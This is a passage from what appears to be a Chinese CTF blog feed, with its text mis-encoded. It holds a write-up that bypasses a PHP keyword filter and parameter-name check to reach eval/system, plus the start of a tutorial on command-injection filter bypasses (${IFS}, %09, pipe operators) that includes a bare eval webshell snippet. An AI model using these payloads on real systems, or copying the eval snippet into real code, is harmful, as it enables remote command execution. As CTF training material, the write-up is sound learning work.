class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>passwordç»MD5åŠ å¯†åå‰å…­ä½å¼ºç­‰äº<code>&quot;c4d038&quot;</code>ï¼Œè¿™ä¸œè¥¿è¦å†™ä¸ªè„šæœ¬æ‰¾ï¼Œç›´æ¥ç”¨ä¹‹å‰åšé¢˜çš„è„šæœ¬æ”¹ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>():<br>    mubiao = <span class="hljs-string">&#x27;c4d038&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        string = <span class="hljs-built_in">str</span>(i)<br>        hash_object = hashlib.md5(string.encode())<br>        <span class="hljs-keyword">if</span> hash_object.hexdigest()[:<span class="hljs-number">6</span>] == mubiao: <span class="hljs-comment">#åˆ‡ç‰‡æ“ä½œï¼Œä»é›¶å¼€å§‹å–å…­ä½</span><br>            <span class="hljs-keyword">return</span> string<br>        i += <span class="hljs-number">1</span><br><br>result = find()<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#ç»“æœï¼š114514</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¦ç»™<code>e_v.a.l</code>å‚æ•°èµ‹å€¼ï¼Œè€Œä¸”ä¼ è¿‡å»çš„å€¼ç»è¿‡æ­£åˆ™åŒ¹é…è¿‡æ»¤åä¼šè¢«evalæ‰§è¡Œã€‚<code>e_v.a.l</code>è¿™ä¸œè¥¿å¾ˆæ˜æ˜¾ä¸æ»¡è¶³å˜é‡åçš„è¦æ±‚ï¼šåŒ…å«äº†å°æ•°ç‚¹ã€‚çœ‹ä¸‹PHPå®˜æ–¹çš„è§£é‡Šï¼š</p><p><img src="/img/a19.png" alt="a19"></p><p>å†™ä¸€å°æ®µä»£ç ä½“ä¼šä¸€ä¸‹å’‹å›äº‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>POSTä¼ <code>e_v.a.l=&#39;hellowold!&#39;</code>ï¼š</p><p>ç»“æœï¼š<code>array(1) &#123;  [&quot;e_v_a_l&quot;]=&gt;  string(12) &quot;&#39;hellowold!&#39;&quot; &#125;</code></p><p>å¯ä»¥çœ‹åˆ°POSTä¼ é€’çš„å‚æ•°ä»<code>e_v.a.l</code>å˜æˆäº†<code>e_v_a_l</code>ï¼Œç©ºæ ¼åŒç†ã€‚(ä½†<code>e_v.a.l</code>å‚æ•°ä»æ²¡è¢«èµ‹å€¼)ã€‚</p><p>è¿™é‡Œ å¼•ç”¨ä¸‹mochuå¸ˆå‚…çš„è§£é‡Šï¼š</p><p>å½“<code>PHPç‰ˆæœ¬å°äº8</code>æ—¶ï¼Œå¦‚æœå‚æ•°ä¸­å‡ºç°ä¸­æ‹¬å·<code>[</code>ï¼Œä¸­æ‹¬å·ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼Œä½†æ˜¯ä¼šå‡ºç°è½¬æ¢é”™è¯¯å¯¼è‡´æ¥ä¸‹æ¥å¦‚æœè¯¥å‚æ•°åä¸­è¿˜æœ‰<code>éæ³•å­—ç¬¦</code>å¹¶ä¸ä¼šç»§ç»­è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸­æ‹¬å·<code>[</code>å‡ºç°åœ¨å‰é¢ï¼Œé‚£ä¹ˆä¸­æ‹¬å·<code>[</code>è¿˜æ˜¯ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ï¼Œä½†æ˜¯å› ä¸ºå‡ºé”™å¯¼è‡´æ¥ä¸‹æ¥çš„éæ³•å­—ç¬¦å¹¶ä¸ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿<code>_</code>ã€‚</p><p>è¿˜æ˜¯ä¸Šé¢é‚£ä¸²ä»£ç ï¼Œå°è¯•<code>post</code>ä¼ å‚<code>e[v.a.l=&#39;hellowold!&#39;</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-string">&quot;e_v.a.l&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;&#x27;hellowold!&#x27;&quot;</span> &#125;<br>hello<br></code></pre></td></tr></table></figure><p>æˆåŠŸç»•è¿‡ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ€ä¹ˆç»•æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>); <br></code></pre></td></tr></table></figure><p>è¿‡æ»¤äº†flag,é‚£çŒœæµ‹flagæ˜¯è—åœ¨&#x2F;flagåº•ä¸‹çš„ï¼Œç›´æ¥ä½¿ç”¨é€šé…ç¬¦ï¼š<code>/fl*</code>å³å¯ã€‚è¿‡æ»¤äº†<code>system</code>å¯ä»¥ä½¿ç”¨<code>(sy.(st).em)</code>ç»•è¿‡(å­—ç¬¦ä¸²æ‹¼æ¥)ã€‚è¿‡æ»¤äº†<code>cat</code>é‚£å°±ç”¨<code>tac</code>ã€‚è¿™é“é¢˜è¿‡æ»¤åœ°å¹¶ä¸æ€ä¹ˆä¸¥æ ¼ã€‚</p><p>payload:</p><p>password&#x3D;114514&amp;e[v.a.l&#x3D;(sy.(st).em)(<code>printf &quot;\154\163&quot;</code>);  æ³¨æ„printfå‰å’Œ163â€œåå„æœ‰ä¸€ä¸ªåå¼•å·ã€‚</p><p>è¿™é‡Œå…³äºç»•è¿‡çš„ä¸€äº›çŸ¥è¯†åœ¨ä¹‹å‰å†™çš„åšå®¢é‡Œè¯´äº†äº›ï¼Œå°±ä¸è¯¦ç»†å†™äº†(æ¯”è¾ƒæ‡’ï¼Œå“ˆå“ˆ)ã€‚</p><p>éæ³•å‚æ•°åä¼ å‚çš„é—®é¢˜å‚è€ƒäº†è¿™ä½å¸ˆå‚…çš„æ–‡ç« ï¼Œæ„Ÿè°¢ï¼</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/mochu7777777/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">115050295</span>?spm=<span class="hljs-number">1001.2014</span>.<span class="hljs-number">3001.5506</span><br></code></pre></td></tr></table></figure><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p>é¢˜ç›®æè¿°ï¼šç®€ç®€å•å•ã€éšå¿ƒæ‰€æ¬²</p><p><img src="/img/a20.png" alt="a20"></p><p>æ„Ÿè§‰åˆæ˜¯æœ€è®¨åŒçš„SQLæ³¨å…¥ã€‚ã€‚ã€‚</p><p>å…ˆçœ‹çœ‹æºç é‡Œæœ‰æ²¡æœ‰å•¥ä¸œè¥¿ï¼Œä¸»è¦çœ‹çœ‹ä»–è¿™ä¸ªç”¨æˆ·åå¯†ç æ˜¯æ€ä¹ˆé™åˆ¶çš„ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">value, type</span>) &#123;<br>            <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;un&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (value.<span class="hljs-property">length</span> &lt; <span class="hljs-number">3</span> || value.<span class="hljs-property">length</span> &gt; <span class="hljs-number">10</span>) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;ç”¨æˆ·åé•¿åº¦å¿…é¡»ä¸º3-10ä¸ªå­—ç¬¦&#x27;</span><br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z0-9_-]+$/</span>.<span class="hljs-title function_">test</span>(value)) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;ç”¨æˆ·åæ ¼å¼é”™è¯¯&#x27;</span><br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;pw&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (value.<span class="hljs-property">length</span> &lt; <span class="hljs-number">6</span> || value.<span class="hljs-property">length</span> &gt; <span class="hljs-number">18</span>) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;å¯†ç é•¿åº¦å¿…é¡»ä¸º6-18ä¸ªå­—ç¬¦&#x27;</span><br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z0-9!@#$%^&amp;_-]+$/</span>.<span class="hljs-title function_">test</span>(value)) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;å¯†ç æ ¼å¼é”™è¯¯&#x27;</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;&#x27;</span><br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>å…ˆæ³¨å†Œä¸€ä¸‹ï¼š</p><p><img src="/img/a21.png" alt="a21"></p><p>ä½†æç¤ºadminå·²ç»è¢«æ³¨å†Œè¿‡äº†ï¼Ÿå¼±å£ä»¤è¯•äº†æŒºå¤šä½†æ²¡å•¥ç”¨ï¼Œç™»ä¸ä¸Šå»ã€‚é‚£å°±éšä¾¿æ³¨å†Œä¸€ä¸ªï¼š</p><p><img src="/img/a22.png" alt="a22"></p><p>ç™»å½•åå‘ç°è·³è½¬åˆ°è¿™ä¹ˆä¸ªç•Œé¢:è¿™ç©æ„å„¿è·Ÿä¸ªå¤è¯»æœºä¼¼çš„ï¼Œä½ æ‰“å•¥ä¸œè¥¿ä»–å°±æŠŠ<code>ä½ </code>å’Œ<code>æ‚¨</code>æ¢æˆ<code>æˆ‘</code>ã€‚<code>å—</code>ç»™æ¢æˆç©ºæ ¼ï¼Œ<code>?</code>æ¢æˆ<code>!</code>ã€‚è€Œä¸”è¿™ä¸œè¥¿ä¸ç”¨æ•°æ®åŒ…(???)ï¼ŒburpsuiteæŠ“åŒ…æ ¹æœ¬æ²¡ç”¨ã€‚ã€‚</p><p>å®ƒè·³è½¬çš„æ—¶å€™æƒ³åˆ°äº†302é‡å®šå‘çš„é—®é¢˜ï¼Œå°±ä¸€ç›´å¼€ç€burpsuiteæ’æŸ¥ï¼Œå‘ç°è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/a23.png" alt="a23"></p><p>ç»“æœé‚£ä¸ªbvæ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/a24.png" alt="a24"></p><p>çœ‹è¿™æ ‡é¢˜æˆ‘å°±æ„Ÿè§‰ä¸å¯¹åŠ²äº†ï¼Œç¿»ç®€ä»‹çš„æ—¶å€™æ ¹æœ¬æ²¡æœ‰ç¬¬ä¸ƒè¡Œã€‚ã€‚(#$$#$%^$#@#$%$#@@#$%^&amp;)ã€‚</p><p>å¦‚æœæ˜¯SQLæ³¨å…¥çš„è¯ï¼Œä¸çŸ¥é“æ³¨å…¥ç‚¹åœ¨å“ªé‡Œã€‚è¯•äº†æŒºå¤šå¼±å£ä»¤ä¹Ÿæ²¡è¯•å‡ºæ¥ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br>   <br><span class="hljs-comment">//e[v.a.l=11</span><br></code></pre></td></tr></table></figure><p>æ„Ÿè°¢mochuå¸ˆå‚…çš„æ–‡ç« ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/mochu7777777/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">115050295</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCEä¸­ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹æ³•</title>
    <link href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5DRCE%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
    <url>/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5DRCE%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>å…¥é—¨çº§ç†è§£ï¼Œæ²¡å•¥å«é‡‘é‡:)</p><span id="more"></span><p><strong>å‘½ä»¤æ‰§è¡Œæ¼æ´å‰ææ¡ä»¶ï¼š</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.å­˜åœ¨å¯è°ƒç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ã€‚<br>2.è¯¥å‡½æ•°å‚æ•°å¯æ§ã€‚<br>3.å¯¹å‚æ•°è¿‡æ»¤ä¸ä¸¥æ ¼ã€‚<br></code></pre></td></tr></table></figure><p><strong>ä¸€äº›å¸¸è§å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-number">1</span>.<span class="hljs-keyword">eval</span>()<span class="hljs-comment">//æŠŠä¸€ä¸²å­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç æ‰§è¡Œ</span><br><span class="hljs-number">2</span>.<span class="hljs-title function_ invoke__">system</span>()/<span class="hljs-title function_ invoke__">passthru</span>()/<span class="hljs-title function_ invoke__">exec</span>()<br><span class="hljs-number">3</span>.<span class="hljs-title function_ invoke__">call_user_func</span>()/<span class="hljs-title function_ invoke__">call_user_func_array</span>() <span class="hljs-comment">//å›è°ƒå‡½æ•°</span><br><span class="hljs-number">4</span>.<span class="hljs-title function_ invoke__">creat_function</span>()<br><span class="hljs-number">5</span>.shell_exec <span class="hljs-comment">//æ³¨æ„è¿™ç©æ„å„¿æ²¡å›æ˜¾ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡æŠŠå®ƒä¼ ç»™æŸä¸ªæ–‡ä»¶æˆ–è€…echoçš„æ–¹æ³•çœ‹æ‰§è¡Œç»“æœï¼Œæ¯”å¦‚ï¼š</span><br>    <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ls -l&#x27;</span>); <span class="hljs-comment">// æ‰§è¡Œls -lå‘½ä»¤å¹¶å°†è¾“å‡ºä¿å­˜åˆ°$outputå˜é‡ä¸­</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>     /?cmd=ls -al / &gt; viper3.txt<br><span class="hljs-number">6</span>.è¿˜å¯ä»¥ç”¨åå¼•å·``å’Œ$()æ‰§è¡Œå‘½ä»¤ã€‚<br><span class="hljs-number">7</span>.preg_matchçš„/eæ¨¡å¼æ¼æ´ã€‚<br></code></pre></td></tr></table></figure><p>æœ€åé‚£ä¸ª&#x2F;eæ¨¡å¼å¥½åƒå·²ç»è¢«å¼ƒç”¨å¥½ä¹…äº†ã€‚ã€‚ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(\d+)/e&#x27;</span>;<br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&#x27;&quot;$1&quot; + 1&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-string">&#x27;123&#x27;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$string</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <span class="hljs-comment">// è¾“å‡º124</span><br></code></pre></td></tr></table></figure><p><code>/(\d+)/e</code>æ¨¡å¼åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—ï¼Œå¹¶ä½¿ç”¨<code>&quot;$1&quot; + 1</code>ä½œä¸ºæ›¿æ¢å­—ç¬¦ä¸²ã€‚åœ¨æ›¿æ¢è¿‡ç¨‹ä¸­ï¼Œ<code>&quot;$1&quot;</code>è¢«è§£æä¸ºåŒ¹é…çš„æ•°å­—ï¼Œç„¶ååŠ 1ã€‚å› æ­¤ï¼Œæœ€ç»ˆçš„æ›¿æ¢ç»“æœæ˜¯123 + 1ï¼Œå³124ã€‚</p><p><strong>ç®¡é“ç¬¦(Windows)ï¼š</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥</span><br><span class="hljs-string">||å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥</span><br><span class="hljs-meta">&amp;å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡</span><br><span class="hljs-meta">&amp;&amp;å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</span><br></code></pre></td></tr></table></figure><p><img src="/img/b2.png" alt="b2"></p><p><img src="/img/b3.png" alt="b3"></p><p><strong>ç®¡é“ç¬¦(Linux)ï¼š</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥</span><br><span class="hljs-string">||å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥</span><br><span class="hljs-meta">&amp;å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡</span><br><span class="hljs-meta">&amp;&amp;å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤</span><br>;       å‰åå‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡<br></code></pre></td></tr></table></figure><p><strong>ç©ºæ ¼ç»•è¿‡(ls &#x2F;å’Œcatç­‰å‡éœ€ç©ºæ ¼)ï¼š</strong></p><p>1.${IFS}</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ls$&#123;IFS&#125;/<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>2.$IFS$9</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ls$IFS$9/<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>3.%09</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:<code>/?cmd=system(&#39;ls%09/&#39;);</code></p><p><img src="/img/b4.png" alt="b4"></p><p>4.&lt;å’Œ&lt;&gt;é‡å®šå‘ç¬¦å·</p><p>åœ¨Linuxä¸­ï¼Œ<code>&lt;</code>æ˜¯ç”¨äºé‡å®šå‘è¾“å…¥çš„ç¬¦å·ï¼Œå®ƒå°†ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ä½œä¸ºå‘½ä»¤çš„è¾“å…¥ã€‚<code>&lt;</code>ç¬¦å·åé¢è·Ÿç€æ–‡ä»¶åï¼Œè¡¨ç¤ºå°†è¯¥æ–‡ä»¶çš„å†…å®¹ä½œä¸ºå‘½ä»¤çš„è¾“å…¥ã€‚</p><p>ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸€ä¸ªåä¸ºinput.txtçš„æ–‡ä»¶ï¼ŒåŒ…å«äº†ä¸€äº›æ–‡æœ¬å†…å®¹ã€‚å¯ä»¥ä½¿ç”¨<code>&lt;</code>ç¬¦å·å°†input.txtæ–‡ä»¶çš„å†…å®¹ä½œä¸ºå‘½ä»¤çš„è¾“å…¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &lt; input.txt<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°å‘½ä»¤å°†ä¼šæ‰§è¡Œcommandå‘½ä»¤ï¼Œå¹¶å°†input.txtæ–‡ä»¶çš„å†…å®¹ä½œä¸ºcommandå‘½ä»¤çš„è¾“å…¥ã€‚</p><p>å¦å¤–ï¼Œ<code>&gt;</code>ç¬¦å·ç”¨äºé‡å®šå‘è¾“å‡ºï¼Œå®ƒå°†å‘½ä»¤çš„è¾“å‡ºä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ›å»ºè¯¥æ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™ä¼šè¦†ç›–åŸæœ‰å†…å®¹ã€‚</p><p>è€Œ<code>&gt;&gt;</code>ç¬¦å·åˆ™ç”¨äºè¿½åŠ 